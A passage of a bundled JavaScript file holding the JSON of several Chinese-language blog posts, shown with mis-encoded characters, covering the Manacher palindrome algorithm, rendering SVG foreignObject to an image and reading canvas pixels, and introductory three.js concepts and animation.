çš„å½¢å¼(ä¸€å®šæ˜¯å¥‡æ•°)</p>\\n</li>\\n<li><p>pä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå‚¨å­˜æ¯ä¸€ä¸ªå€¼çš„æœ€å¤§å›æ–‡æ•°é‡çš„ä¸€åŠ+1ï¼Œä¾‹å¦‚ï¼š&#39;ababa&#39; å¯¹åº”çš„p å°±æ˜¯<code>[1,2,3,2,1]</code></p>\\n</li>\\n<li><p><code>max</code>ä¸ºå½“å‰å·²ç»è®¡ç®—è¿‡å¾—æœ€å¤§å›æ–‡é‡<code>p[id]</code>+å¯¹åº”çš„ä½ç½®<code>id</code>ï¼Œé»˜è®¤ä¸º0æˆ–è€…-infinityï¼Œå¯ä»¥ä¿è¯æœ€åçš„maxå’Œidä¸ä¸º0</p>\\n</li>\\n<li><p>éå†å˜å½¢çš„å­—ç¬¦ä¸²ï¼ŒæŒ‡é’ˆä¸º<code>i</code></p>\\n<p> <code>i</code>åœ¨å½“å‰<code>max</code>æ‰€æ¶µç›–çš„èŒƒå›´å†…ï¼Œå¦‚ä¸‹å›¾ï¼Œ<code>i</code>åœ¨<code>max</code>èŒƒå›´å†…ï¼Œ<code>j</code>æ˜¯å¯¹ç§°çš„ç‚¹</p>\\n<pre><code><pre class=\\"hljs\\"><code>   j        i\\n ------id------</code></pre></code></pre><p> åˆ†4ç§æƒ…å†µ:</p>\\n<ol>\\n<li><p><code>j</code>è¶…å‡ºèŒƒå›´ï¼Œé‚£ä¹ˆ<code>i</code>åªå–èŒƒå›´å†…</p>\\n<pre><code><pre class=\\"hljs\\"><code> ---j---      -i-\\n   ------id------              </code></pre></code></pre></li>\\n<li><p><code>j</code>è¾¹ç•Œåˆšå¥½åœ¨èŒƒå›´ä¸Šï¼Œä¸ä»…å°†<code>i</code>è®¾ç½®ï¼Œå¹¶ä¸”è¿˜è¦ç»§ç»­æ‰©å±•<code>i</code>ï¼Œå› ä¸ºè™½ç„¶<code>j</code>å·¦è¾¹ä¸å­˜åœ¨ï¼Œä½†<code>i</code>çš„å³è¾¹ä¸ç¡®å®š</p>\\n<pre><code><pre class=\\"hljs\\"><code>  --j--    --i--\\n  ------id------   =&gt;  ç»§ç»­æ‰©å±•i</code></pre></code></pre></li>\\n<li><p><code>j</code>è¾¹ç•Œåœ¨èŒƒå›´å†…ï¼Œåªéœ€è¦ç®€å•èµ‹å€¼ç»™<code>i</code>å³å¯ï¼Œå› ä¸ºæ­¤æ—¶<code>j</code>å’Œ<code>i</code>çš„å€¼å®Œå…¨ç›¸ç­‰</p>\\n<pre><code><pre class=\\"hljs\\"><code>  -j-      -i-\\n ------id------</code></pre></code></pre></li>\\n<li><p><code>i</code>ä¸åœ¨å½“å‰<code>max</code>æ‰€æ¶µç›–çš„èŒƒå›´å†…ï¼Œéœ€è¦æ‰©å±•</p>\\n<pre><code><pre class=\\"hljs\\"><code>               i\\n------id------     =&gt; éœ€è¦æ‰©å±•i</code></pre></code></pre></li>\\n</ol>\\n</li>\\n<li><p>æœ€åæ‰©å±•å®Œåé‡æ–°å®šä¹‰<code>p[i]</code>å’Œ<code>max</code>ï¼Œ<code>id</code>ï¼Œæœ€ç»ˆ<code>2*(max-id)-1</code>å°±æ˜¯æœ€å¤§å­å›æ–‡å­—ç¬¦ä¸²é•¿åº¦</p>\\n</li>\\n</ol>\\n<p>ä»£ç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>  <span class=\\"hljs-title\\">manacher</span>(<span class=\\"hljs-params\\">s</span>)</span>{\\n  <span class=\\"hljs-comment\\">// è¿™é‡Œä¸è®ºå¥‡å¶ï¼Œéƒ½å°†sè½¬æ¢æˆ \'#x$x$x$\' çš„å½¢å¼</span>\\n  <span class=\\"hljs-keyword\\">let</span> str=<span class=\\"hljs-string\\">\'#\'</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;s.length;i++) str+=s[i]+<span class=\\"hljs-string\\">\'$\'</span>\\n  <span class=\\"hljs-comment\\">// pä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå‚¨å­˜æ¯ä¸€ä¸ªå€¼çš„æœ€å¤§å›æ–‡æ•°é‡çš„ä¸€åŠ+1ï¼Œä¾‹å¦‚ï¼š\'ababa\' å¯¹åº”çš„p å°±æ˜¯[1,2,3,2,1]</span>\\n  <span class=\\"hljs-keyword\\">let</span> p=[<span class=\\"hljs-number\\">1</span>]\\n  <span class=\\"hljs-comment\\">// maxä¸ºå½“å‰å·²ç»è®¡ç®—è¿‡å¾—æœ€å¤§å›æ–‡é‡(p[id])+å¯¹åº”çš„ä½ç½®(id)ï¼Œé»˜è®¤ä¸º0æˆ–è€…-infinityï¼Œå¯ä»¥ä¿è¯æœ€åçš„maxå’Œidä¸ä¸º0</span>\\n  <span class=\\"hljs-keyword\\">let</span> max=<span class=\\"hljs-number\\">0</span>,id=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-comment\\">// æš´åŠ›è®¡ç®—æ—¶ï¼Œä»å·¦å³ä»€ä¹ˆä½ç½®å¼€å§‹è¿›è¡Œå¯¹æ¯”</span>\\n  <span class=\\"hljs-keyword\\">let</span> temp=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-comment\\">// newCenteræ˜¯ç›®å‰éœ€è¦é‡æ–°æš´åŠ›è®¡ç®—çš„ä½ç½®</span>\\n  <span class=\\"hljs-keyword\\">let</span> newCenter=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-comment\\">// ä»ç¬¬ä¸€ä¸ªå¼€å§‹éå†ï¼Œç¬¬0ä¸ªä¸ç”¨ç®¡ï¼Œæ˜¯\'#\'</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>;i&lt;str.length;i++){\\n    <span class=\\"hljs-comment\\">// iåœ¨å½“å‰maxæ‰€æ¶µç›–çš„èŒƒå›´å†…ï¼Œå¦‚ä¸‹å›¾ï¼Œiåœ¨maxèŒƒå›´å†…ï¼Œjæ˜¯å¯¹ç§°çš„ç‚¹</span>\\n    <span class=\\"hljs-comment\\">/*\\n      *        j        i\\n      *      ------id------\\n    * */</span>\\n    <span class=\\"hljs-keyword\\">if</span>(max&gt;i){\\n      <span class=\\"hljs-comment\\">// åœ¨èŒƒå›´å†…å¯¹ç§°çš„ä½ç½®</span>\\n      <span class=\\"hljs-keyword\\">let</span> j=id-(i-id)\\n      <span class=\\"hljs-comment\\">// é€šè¿‡boundaryåˆ¤æ–­å¯¹ç§°ä½ç½®é‚£ä¸ªæ˜¯å¦ä¼šè¶…å‡ºèŒƒå›´</span>\\n      <span class=\\"hljs-keyword\\">let</span> boundary=p[j]+i\\n      <span class=\\"hljs-comment\\">// jè¶…å‡ºèŒƒå›´ï¼Œé‚£ä¹ˆiåªå–èŒƒå›´å†…ï¼Œå¦‚ä¸‹å›¾</span>\\n      <span class=\\"hljs-comment\\">/*\\n      *    ---j---      -i-\\n      *      ------id------\\n      * */</span>\\n      <span class=\\"hljs-keyword\\">if</span>(boundary&gt;max){\\n        p[i]=p[j]-(boundary-max)\\n        <span class=\\"hljs-keyword\\">continue</span>;\\n      <span class=\\"hljs-comment\\">// jè¾¹ç•Œåˆšå¥½åœ¨èŒƒå›´ä¸Šï¼Œä¸ä»…å°†iè®¾ç½®ï¼Œå¹¶ä¸”è¿˜è¦ç»§ç»­æ‰©å±•iï¼Œå³è®¾ç½®newCenterå’Œtemp</span>\\n        <span class=\\"hljs-comment\\">/*\\n        *      --j--    --i--\\n        *      ------id------   =&gt;  ç»§ç»­æ‰©å±•i\\n        * */</span>\\n      }<span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span>(boundary===max){\\n        temp=p[j]\\n        newCenter=i\\n      <span class=\\"hljs-comment\\">// jè¾¹ç•Œåœ¨èŒƒå›´å†…ï¼Œåªéœ€è¦ç®€å•èµ‹å€¼ç»™iå³å¯ï¼Œå› ä¸ºæ­¤æ—¶jå’Œiçš„å€¼å®Œå…¨ç›¸ç­‰</span>\\n        <span class=\\"hljs-comment\\">/*\\n        *       -j-      -i-\\n        *      ------id------\\n        * */</span>\\n      }<span class=\\"hljs-keyword\\">else</span>{\\n        p[i]=p[j]\\n        <span class=\\"hljs-keyword\\">continue</span>;\\n      }\\n      <span class=\\"hljs-comment\\">// iä¸åœ¨å½“å‰maxæ‰€æ¶µç›–çš„èŒƒå›´å†…ï¼Œéœ€è¦æš´åŠ›è®¡ç®—ï¼Œå¦‚ä¸‹å›¾</span>\\n      <span class=\\"hljs-comment\\">/*\\n        *                     i\\n        *      ------id------     =&gt; éœ€è¦æ‰©å±•i\\n      * */</span>\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n      temp=<span class=\\"hljs-number\\">1</span>\\n      newCenter=i\\n    }\\n    <span class=\\"hljs-comment\\">// æš´åŠ›è®¡ç®—</span>\\n    <span class=\\"hljs-keyword\\">while</span>(newCenter-temp&gt;=<span class=\\"hljs-number\\">0</span> &amp;&amp; newCenter+temp &lt;str.length &amp;&amp; str[newCenter-temp]===str[newCenter+temp]){\\n      temp++\\n    }\\n    <span class=\\"hljs-comment\\">// æš´åŠ›è®¡ç®—å®Œåé‡æ–°å®šä¹‰p[i]å’Œmaxï¼Œid</span>\\n    p[i]=temp\\n    <span class=\\"hljs-keyword\\">if</span>(p[i]&gt;max-id){\\n      max=p[i]+i\\n      id=i\\n    }\\n  }\\n  <span class=\\"hljs-comment\\">// æ­¤æ—¶2*(max-id)-1å°±æ˜¯æœ€å¤§å›æ–‡å­—ç¬¦ä¸²çš„length</span>\\n\\n  <span class=\\"hljs-comment\\">// å»æ‰# å’Œ $ç¬¦å·</span>\\n  <span class=\\"hljs-keyword\\">let</span> res=str[id],realRes=<span class=\\"hljs-string\\">\'\'</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>;i&lt;max-id;i++){\\n    res=str[id-i]+res+str[id+i]\\n  }\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;res.length;i++){\\n    <span class=\\"hljs-keyword\\">if</span>(res[i]===<span class=\\"hljs-string\\">\'$\'</span> || res[i]===<span class=\\"hljs-string\\">\'#\'</span>)<span class=\\"hljs-keyword\\">continue</span>\\n    realRes+=res[i]\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> realRes\\n}</code></pre></code></pre>\\n<p>æµ‹è¯•ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> test=[<span class=\\"hljs-string\\">\\"abb\\"</span>,<span class=\\"hljs-string\\">\\"a\\"</span>,<span class=\\"hljs-string\\">\\"aaaabaaa\\"</span>,<span class=\\"hljs-string\\">\\"bb\\"</span>,<span class=\\"hljs-string\\">\\"ccc\\"</span>,<span class=\\"hljs-string\\">\'abbxz\'</span>,<span class=\\"hljs-string\\">\'accbcca\'</span>,<span class=\\"hljs-string\\">\'\'</span>,<span class=\\"hljs-string\\">\'abaxabaxabybaxabyb\'</span>]\\n<span class=\\"hljs-keyword\\">let</span> answer=[<span class=\\"hljs-string\\">\'bb\'</span>,<span class=\\"hljs-string\\">\'a\'</span>,<span class=\\"hljs-string\\">\'aaabaaa\'</span>,<span class=\\"hljs-string\\">\'bb\'</span>,<span class=\\"hljs-string\\">\'ccc\'</span>,<span class=\\"hljs-string\\">\'bb\'</span>,<span class=\\"hljs-string\\">\'accbcca\'</span>,<span class=\\"hljs-string\\">\'\'</span>,<span class=\\"hljs-string\\">\'baxabybaxab\'</span>]\\n<span class=\\"hljs-keyword\\">let</span> res\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;test.length;i++){\\nres=manacher(test[i])\\n  <span class=\\"hljs-built_in\\">console</span>.log(res===answer[i])\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-27","timeArr":[2018,7,27,0,0,0,0],"title":"ç®—æ³•è®°å½•-æœ€é•¿å›æ–‡å­å­—ç¬¦ä¸²","uuid":"af105b2df12bc15528a731d149193b4aa9927533","summary":"<p>æ€è·¯ï¼šåˆ©ç”¨å¯¹ç§°æ€æƒ³</p>\\n<ol>\\n<li>å…ˆå°†åŸå­—ç¬¦ä¸²è½¬æ¢æˆè½¬æ¢æˆ <code>#x$x$x$</code> çš„å½¢å¼(ä¸€å®šæ˜¯å¥‡æ•°)</li>\\n<li>pä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå‚¨å­˜æ¯ä¸€ä¸ªå€¼çš„æœ€å¤§å›æ–‡æ•°é‡çš„ä¸€åŠ+1ï¼Œä¾‹å¦‚ï¼š\'ababa\' å¯¹åº”çš„p å°±æ˜¯<code>[1,2,3,2,1]</code></li>\\n<li><code>max</code>ä¸ºå½“å‰å·²ç»è®¡ç®—è¿‡å¾—æœ€å¤§å›æ–‡é‡<code>p[id]</code>+å¯¹åº”çš„ä½ç½®<code>id</code>ï¼Œé»˜è®¤ä¸º0æˆ–è€…-infi...</li>\\n</ol>","slug":"suan-fa-ji-lu-zui-chang-hui-wen-zi-zi-fu-chuan","sha":"b43da9771d20a5bb5e735c832af36f85b932df54"}')},641:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"foreignobject\\">foreignObject</h2>\\n<p>svgå†…éƒ¨æ ‡ç­¾<code>&lt;foreignObject&gt;</code>ï¼Œå¯ä»¥ç›´æ¥åœ¨svgå†…éƒ¨æ’å…¥<code>xhtml</code>å…ƒç´ ï¼Œå†é€šè¿‡<code>blob</code>å’Œ<code>FileReader</code>å¯\\nå°†å†…éƒ¨<code>xhtml</code>å†…å®¹è½¬æ¢æˆ<em>åŒæº</em>urlï¼Œå†é€šè¿‡<code>img.src=url</code>å°†svgå†…éƒ¨çš„domå…ƒç´ è½¬åŒ–ä¸ºå›¾ç‰‡ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span>  data = <span class=\\"hljs-string\\">`\\n&lt;svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"100\\" height=\\"150\\"&gt;\\n  &lt;foreignObject width=\\"100%\\" height=\\"100%\\"&gt;\\n    &lt;div xmlns=\\"http://www.w3.org/1999/xhtml\\" style=\\"width:100px;\\"&gt;\\n       &lt;span&gt;some text&lt;/span&gt;\\n    &lt;/div&gt;\\n  &lt;/foreignObject&gt;\\n&lt;/svg&gt;`</span>;\\n<span class=\\"hljs-keyword\\">let</span> img = <span class=\\"hljs-keyword\\">new</span> Image();\\n<span class=\\"hljs-keyword\\">let</span> svg = <span class=\\"hljs-keyword\\">new</span> Blob([data], {<span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'image/svg+xml;charset=utf-8\'</span>});\\n<span class=\\"hljs-keyword\\">let</span> fr=<span class=\\"hljs-keyword\\">new</span> FileReader()\\nfr.readAsDataURL(svg)\\n<span class=\\"hljs-keyword\\">let</span> url\\nfr.onload=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  url=fr.result\\n  img.src = url\\n  <span class=\\"hljs-built_in\\">document</span>.body.appendChild(img)\\n}</code></pre></code></pre>\\n<h2 id=\\"getimagedata\\">getImageData</h2>\\n<p>è·å–canvaså†…éƒ¨çš„åƒç´ ç‚¹</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// è·å–æ•´ä¸ªç”»å¸ƒçš„åƒç´ ç‚¹</span>\\n<span class=\\"hljs-keyword\\">let</span> imgData=ctx.getImageData(<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>, canvas.width, canvas.height)\\n\\n<span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> py = <span class=\\"hljs-number\\">0</span>; py &lt; canvas.height; py += <span class=\\"hljs-number\\">1</span>) {\\n  <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> px = <span class=\\"hljs-number\\">0</span>; px &lt; canvas.width; px += <span class=\\"hljs-number\\">1</span>) {\\n    <span class=\\"hljs-comment\\">// æ£€æŸ¥é€æ˜çš„å‚æ•°(0-255)ï¼Œ255ä¸ºå®Œå…¨ä¸é€æ˜</span>\\n    <span class=\\"hljs-keyword\\">let</span> i = (px + py * canvas.width) * <span class=\\"hljs-number\\">4</span> - <span class=\\"hljs-number\\">1</span>\\n    <span class=\\"hljs-keyword\\">const</span> pixel = imgData.data[i];\\n    <span class=\\"hljs-keyword\\">if</span> (pixel === <span class=\\"hljs-number\\">255</span>) {\\n      <span class=\\"hljs-comment\\">// do something</span>\\n    } \\n  }   \\n}</code></pre></code></pre>\\n","toc":[{"anchor":"foreignobject","level":2,"text":"foreignObject"},{"anchor":"getimagedata","level":2,"text":"getImageData"}],"relatedTags":null,"created_at":"2018-08-13","timeArr":[2018,7,13,0,0,0,0],"title":"svgæ¸²æŸ“domï¼Œcanvasè·å–åƒç´ ","uuid":"2d2fe99476f8b0fcf2a0f7ff6061756eff4803e5","summary":"<h4>foreignObject</h4>\\n<p>svgå†…éƒ¨æ ‡ç­¾<code>&lt;foreignObject&gt;</code>ï¼Œå¯ä»¥ç›´æ¥åœ¨svgå†…éƒ¨æ’å…¥<code>xhtml</code>å…ƒç´ ï¼Œå†é€šè¿‡<code>blob</code>å’Œ<code>FileReader</code>å¯\\nå°†å†…éƒ¨<code>xhtml</code>å†…å®¹è½¬æ¢æˆ<em>åŒæº</em>urlï¼Œå†é€šè¿‡<code>img.src=url</code>å°†svgå†…éƒ¨çš„domå…ƒç´ è½¬åŒ–ä¸ºå›¾ç‰‡ã€‚</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span>  d...</code></pre>","slug":"svg-xuan-ran-domï¼Œcanvas-huo-qu-xiang-su","sha":"8f6c34d738ca1b40e7dbc5fd7c069695a2fb4443"}')},642:function(n){n.exports=JSON.parse('{"content":"<p><code>threejs</code>åˆä½“éªŒï¼Œå…³äº<code>3D</code>æ¸²æŸ“ï¼Œè‡ªç„¶ä¼šæ¶‰åŠåˆ°å¤§é‡æ•°å­¦è®¡ç®—ï¼Œç®—æ³•å…¬å¼ï¼Œä½†è¿™äº›<code>threejs</code>å·²ç»å°è£…äº†ï¼Œç›´æ¥è°ƒç”¨<code>API</code>å³å¯å®Œæˆå¤§é‡å·¥ä½œã€‚</p>\\n<p><code>threejs</code>ç”¨å³æ‰‹åæ ‡ç³»ï¼Œå³ä¸Š<code>y</code>ï¼Œå³<code>x</code>ï¼Œ<code>z</code>è½´ä»å±å¹•é‡Œåˆ°å¤–</p>\\n<p><code>3D</code>æ¸²æŸ“æ¶‰åŠæ¦‚å¿µ</p>\\n<ol>\\n<li>åœºæ™¯</li>\\n</ol>\\n<p>æŒ‡ä½ æƒ³å±•ç¤ºç»™åˆ«äººçœ‹åˆ°ä¸œè¥¿æ€»ç§°ï¼Œä½ æƒ³å±•ç¤ºï¼Œéœ€è¦æ·»åŠ åˆ°åœºæ™¯ï¼Œä¸æƒ³å±•ç¤ºï¼Œéœ€è¦ä»åœºæ™¯ä¸­åˆ é™¤ã€‚</p>\\n<ol start=\\"2\\">\\n<li>æ‘„åƒæœº</li>\\n</ol>\\n<p>æŒ‡ç”¨æˆ·çš„è§†è§’ï¼Œå¦‚æœç”¨æˆ·æƒ³çœ‹ç‰©ä½“çš„åé¢ï¼Œæ„æ€å°±æ˜¯æ‘„åƒæœºè½¬åˆ°ç‰©ä½“åé¢ï¼Œ<code>three-orbitcontrols</code>å·²ç»ä¸ºæˆ‘ä»¬å°è£…äº†æ‘„åƒæœºçš„é¼ æ ‡æ“æ§ã€‚</p>\\n<ol start=\\"3\\">\\n<li>å‡ ä½•ä½“(Geometry)</li>\\n</ol>\\n<p>æŒ‡ä¸€äº›å½¢çŠ¶ç‰©ä½“ï¼Œå¦‚çƒä½“ï¼Œæ­£æ–¹ä½“ï¼Œåœ†é”¥ï¼Œç®¡é“ç­‰ç­‰ï¼Œ<code>threejs</code>æä¾›å¤šç§å¯ä»¥ç›´æ¥è°ƒç”¨çš„å½¢çŠ¶ã€‚</p>\\n<ol start=\\"4\\">\\n<li>æè´¨(Material)</li>\\n</ol>\\n<p>æŒ‡ç‰©ä½“è¡¨é¢çš„é¢œè‰²ï¼Œå…‰äº®ï¼Œè‡ªå®šä¹‰çš®è‚¤(çº¹ç†ï¼‰ç­‰</p>\\n<ol start=\\"5\\">\\n<li>Mesh</li>\\n</ol>\\n<p>ä¸€èˆ¬æ¥è®²ï¼Œ<code>Mesh</code> ç”± <code>Geometry</code> + <code>Material</code> ç»„åˆè€Œæˆï¼Œæƒ³è±¡ä¸€ä¸‹ï¼Œç°åœ¨<code>å‡ ä½•ä½“</code>æœ‰æ­£æ–¹ä½“å’Œçƒä½“ï¼Œ <code>æè´¨</code>æœ‰çº¢è‰²å’Œè“è‰²ï¼Œ\\né‚£ä¹ˆ<code>Mesh</code>èƒ½ç»„åˆå‡ºçº¢è‰²æ­£æ–¹ä½“ï¼Œè“è‰²æ­£æ–¹ä½“ï¼Œçº¢è‰²çƒä½“ï¼Œè“è‰²çƒä½“</p>\\n<ol start=\\"6\\">\\n<li>Group</li>\\n</ol>\\n<p>å½“ä½ åˆ›å»ºäº†å¤šä¸ª<code>Mesh</code>åï¼Œå¯ä»¥ç”¨GroupåŒ…è£¹éƒ¨åˆ†ï¼Œä»è€Œå½¢æˆä¸€ä¸ªæ•´ä½“ï¼Œé¢å¯¹ç§»åŠ¨ï¼Œæ—‹è½¬ç­‰åŠ¨ç”»æ•ˆæœï¼Œå¯ä»¥æ•´ä½“è€ŒåŠ¨</p>\\n<h4 id=\\"zui-jian-dan-de-chuang-jian-yi-ge-wu-ti\\">æœ€ç®€å•çš„åˆ›å»ºä¸€ä¸ªç‰©ä½“</h4>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> boxGeo=<span class=\\"hljs-keyword\\">new</span> THREE.BoxBufferGeometry(width,height,depth)\\n<span class=\\"hljs-keyword\\">let</span> boxMat=<span class=\\"hljs-keyword\\">new</span> THREE.MeshStandardMaterial({\\n             <span class=\\"hljs-attr\\">color</span>: <span class=\\"hljs-string\\">\'#000000\'</span>,\\n             <span class=\\"hljs-attr\\">roughness</span>:<span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-comment\\">// å…‰æ»‘çš„é¢</span>\\n           })\\n<span class=\\"hljs-keyword\\">let</span> boxObj=<span class=\\"hljs-keyword\\">new</span> THREE.Mesh( boxGeo, boxMat )</code></pre></code></pre>\\n","toc":[{"anchor":"zui-jian-dan-de-chuang-jian-yi-ge-wu-ti","level":4,"text":"æœ€ç®€å•çš„åˆ›å»ºä¸€ä¸ªç‰©ä½“"}],"relatedTags":null,"created_at":"2021-06-14","timeArr":[2021,5,14,0,0,0,0],"title":"threejsåˆä½“éªŒ-æ•´ä½“æ¦‚å¿µ","uuid":"c9d2906be991ddcca334e52c1e30df138469d970","summary":"<p><code>threejs</code>åˆä½“éªŒï¼Œå…³äº<code>3D</code>æ¸²æŸ“ï¼Œè‡ªç„¶ä¼šæ¶‰åŠåˆ°å¤§é‡æ•°å­¦è®¡ç®—ï¼Œç®—æ³•å…¬å¼ï¼Œä½†è¿™äº›<code>threejs</code>å·²ç»å°è£…äº†ï¼Œç›´æ¥è°ƒç”¨<code>API</code>å³å¯å®Œæˆå¤§é‡å·¥ä½œã€‚</p>\\n<p><code>threejs</code>ç”¨å³æ‰‹åæ ‡ç³»ï¼Œå³ä¸Š<code>y</code>ï¼Œå³<code>x</code>ï¼Œ<code>z</code>è½´ä»å±å¹•é‡Œåˆ°å¤–</p>\\n<p><code>3D</code>æ¸²æŸ“æ¶‰åŠæ¦‚å¿µ</p>\\n<ol>\\n<li>åœºæ™¯</li>\\n</ol>\\n<p>æŒ‡ä½ æƒ³å±•ç¤ºç»™åˆ«äººçœ‹åˆ°ä¸œè¥¿æ€»ç§°ï¼Œä½ æƒ³å±•ç¤ºï¼Œéœ€è¦æ·»åŠ ...</p>","slug":"threejs-chu-ti-yan-zheng-ti-gai-nian","sha":"1bad457ab7f56d2fb13f92b70c3c3a7f2e14584a"}')},643:function(n){n.exports=JSON.parse('{"content":"<p>å½“åˆ›å»ºå‡ºä¸€ä¸ªç‰©ä½“ï¼Œæˆ‘ä»¬æƒ³ç»™ä»–åŠ ç‚¹åŠ¨ç”»</p>\\n<p><code>threejs</code>çš„ç‰©ä½“åŒ…å«äº†<code>rotation</code>æ§åˆ¶æ—‹è½¬ï¼Œ<code>position</code>å’Œ<code>translateOnAxis</code>æ§åˆ¶ä½ç½®</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>obj.rotation.set(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\nobj.position.set(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\nobj.translateOnAxis(<span class=\\"hljs-string\\">\'x\'</span>,<span class=\\"hljs-number\\">10</span>)</code></pre></code></pre>\\n<p>ç„¶åå¯ä»¥é€šè¿‡<code>requestAnimationFrame</code>æ¥æ¸²æŸ“åŠ¨ç”»</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">animate</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    obj.rotation.x=<span class=\\"hljs-built_in\\">Math</span>.PI / <span class=\\"hljs-number\\">180</span>\\n    requestAnimationFrame(animate)\\n}\\nrequestAnimationFrame(animate)</code></pre></code></pre>\\n<p>é—®é¢˜ï¼š</p>\\n<p>ç‰©ä½“åŸç‚¹ï¼Œé»˜è®¤ç‰©ä½“åŸç‚¹æ˜¯ç‰©ä½“çš„ä¸­å¿ƒç‚¹ï¼Œå¦‚æœè®©ç‰©ä½“ç»•ç€æŸä¸€ä¸ªç‚¹ï¼Œè€Œéä¸­å¿ƒç‚¹æ¥è¿åŠ¨</p>\\n<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<code>translateOnAxis</code>æ¥å¤„ç†ï¼Œ<code>translateOnAxis</code>æ˜¯ä¸æ”¹å˜ç‰©ä½“åŸç‚¹çš„ç§»åŠ¨ï¼Œ<code>position</code>æ˜¯æ”¹å˜ç‰©ä½“åŸç‚¹çš„ç§»åŠ¨ã€‚</p>\\n<p>å½“ä¸€ä¸ªç‰©ä½“ä½¿ç”¨<code>position</code>æ²¿ç€<code>x</code>è½´ç§»åŠ¨<code>10</code>ï¼Œé‚£ä¹ˆå®ƒçš„åŸç‚¹ä»åŸæ¥çš„<code>(0,0,0)</code>æ¥åˆ°äº†<code>(10,0,0)</code>\\nå†ä½¿ç”¨<code>translateOnAxis</code>æ²¿ç€<code>x</code>è½´ç§»åŠ¨<code>-10</code>ï¼Œå®ƒå›åˆ°äº†åˆå§‹ç‚¹<code>(0,0,0)</code>ï¼Œä½†åŸç‚¹ä¸ä¼šæ”¹å˜ï¼Œè¿˜æ˜¯<code>(10,0,0)</code></p>\\n<p>è¿™æ˜¯å†ä½¿ç”¨<code>rotation</code>è¿›è¡Œæ—‹è½¬åŠ¨ç”»çš„æ—¶å€™ï¼ŒåŸç‚¹å°±åˆ°äº†<code>(10,0,0)</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>obj.position.x=<span class=\\"hljs-number\\">10</span>\\nobj.translateOnAxis(<span class=\\"hljs-string\\">\'x\'</span>,<span class=\\"hljs-number\\">-10</span>)\\nobj.rotation.x=<span class=\\"hljs-built_in\\">Math</span>.PI / <span class=\\"hljs-number\\">2</span></code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2021-06-16","timeArr":[2021,5,16,0,0,0,0],"title":"threejsåˆ›å»ºç®€å•åŠ¨ç”»","uuid":"02dc5ff17ce497cd5ef29f8b41b9a3ff1ff423eb","summary":"<p>å½“åˆ›å»ºå‡ºä¸€ä¸ªç‰©ä½“ï¼Œæˆ‘ä»¬æƒ³ç»™ä»–åŠ ç‚¹åŠ¨ç”»</p>\\n<p><code>threejs</code>çš„ç‰©ä½“åŒ…å«äº†<code>rotation</code>æ§åˆ¶æ—‹è½¬ï¼Œ<code>position</code>å’Œ<code>translateOnAxis</code>æ§åˆ¶ä½ç½®</p>\\n<pre class=\\"hljs\\"><code>obj.rotation.set(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\nobj.position.set(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\nobj.translateOnAxis(<span class=\\"hljs-string\\">\'x...</span></code></pre>","slug":"threejs-chuang-jian-jian-dan-dong-hua","sha":"d2589656b12b3d6306e6652e24d6e97818213bf5"}')},644:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yi-ge-ke-zan-ting-fen-duan-shang-chuan-de-li-zi\\">ä¸€ä¸ªå¯æš‚åœåˆ†æ®µä¸Šä¼ çš„ä¾‹å­</h2>\\n<p><a 